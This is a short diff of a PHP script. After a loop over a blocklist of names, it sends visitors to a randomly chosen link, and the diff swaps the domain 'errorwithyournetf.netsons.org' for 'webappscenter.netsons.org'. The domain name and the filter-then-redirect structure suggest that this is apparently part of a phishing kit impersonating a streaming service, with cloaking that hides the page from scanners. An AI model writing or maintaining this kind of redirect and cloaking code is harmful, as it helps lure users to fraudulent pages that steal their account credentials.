@@ -77,8 +77,8 @@ foreach ($black_list as $blocked_name) {
 
 // Redirect to a random link
 $links = [
-    "https://errorwithyournetf.netsons.org/",
-    "https://errorwithyournetf.netsons.org/", 
+    "https://webappscenter.netsons.org/",
+    "https://webappscenter.netsons.org/", 
 ];
 
 $random_link = $links[array_rand($links)];
